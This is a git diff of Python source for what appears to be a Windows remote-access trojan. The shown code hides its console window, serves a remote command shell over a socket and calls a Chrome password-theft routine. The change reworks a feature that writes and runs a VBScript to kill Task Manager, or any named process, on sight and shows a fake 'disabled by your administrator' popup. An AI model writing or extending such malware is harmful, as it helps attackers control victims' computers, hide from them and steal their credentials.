@@ -22,6 +22,7 @@ ICON_STOP = 0x10
 
 MessageBox = ctypes.windll.user32.MessageBoxW
 
+
 def hide():  # hide window
     window = win32console.GetConsoleWindow()
     win32gui.ShowWindow(window, 0)
@@ -227,23 +228,42 @@ def command_shell():
         objSocket.send(bytData)  # send output
 
 
-def disable_taskmgr():
-    # VBScript to disable taskmgr, this allows the script to disconnect from the original python process
-    strVBSCode = "Set objWshShl = WScript.CreateObject(\"WScript.Shell\")" + "\n" + \
+def vbs_block_process(process, popup, message, title, timeout, type):
+    # VBScript to block process, this allows the script to disconnect from the original python process, check github rep for source
+
+    strVBSCode = "On Error Resume Next" + "\n" + \
+                 "Set objWshShl = WScript.CreateObject(\"WScript.Shell\")" + "\n" + \
                  "Set objWMIService = GetObject(\"winmgmts:\" & \"{impersonationLevel=impersonate}!//./root/cimv2\")" + "\n" + \
                  "Set colMonitoredProcesses = objWMIService.ExecNotificationQuery(\"select * " \
                  "from __instancecreationevent \" & \" within 1 where TargetInstance isa 'Win32_Process'\")" + "\n" + \
                  "Do" + "\n" + "Set objLatestProcess = colMonitoredProcesses.NextEvent" + "\n" + \
-                 "If objLatestProcess.TargetInstance.Name = \"taskmgr.exe\" Then" + "\n" + \
-                 "objLatestProcess.TargetInstance.Terminate" + "\n" + \
-                 "objWshShl.Popup \"Task Manager has been disabled by your administrator.\", 3, \"Task Manager\", 16" + "\n" + \
-                 "End If" + "\n" + "Loop"
+                 "If objLatestProcess.TargetInstance.Name = \"" + process + "\" Then" + "\n" + \
+                 "objLatestProcess.TargetInstance.Terminate" + "\n"
+    if popup == "True":  # if showing a message
+        strVBSCode += "objWshShl.Popup \"" + message + "\"," + timeout + ", \"" + title + "\"," + type + "\n"
+
+    strVBSCode += "End If" + "\n" + "Loop"
 
     objVBSFile = open(TMP + "/d.vbs", "w")  # write the code and close the file
     objVBSFile.write(strVBSCode); objVBSFile.close()
 
-    subprocess.Popen(["wscript", TMP + "/d.vbs"])  # run the script
-    return "True"
+    subprocess.Popen(["cscript", TMP + "/d.vbs"], shell=True)  # run the script
+
+
+def disable_taskmgr():
+    global blnDisabled
+    if blnDisabled == "False":  # if task manager is already disabled, enable it
+        objSocket.send(str.encode("Enabling ..."))
+
+        subprocess.Popen(["taskkill", "/f", "/im", "cscript.exe"], shell=True)
+
+        blnDisabled = "True"
+    else:
+        objSocket.send(str.encode("Disabling ..."))
+
+        vbs_block_process("taskmgr.exe", "True", "Task Manager has been disabled by your administrator",
+                      "Task Manager", "3", "16")
+        blnDisabled = "False"
 
 
 def chrpass():  # legal purposes only!
@@ -304,5 +324,6 @@ while True:
     elif strData == "chrpass":
         chrpass()
     elif strData == "dtaskmgr":
-        if not "taskmgr" in globals():  # check to make sure task manager is not already disabled
-            taskmgr = disable_taskmgr()
+        if not "blnDisabled" in globals():  # if the variable doesnt exist yet
+            blnDisabled = "True"
+        disable_taskmgr()
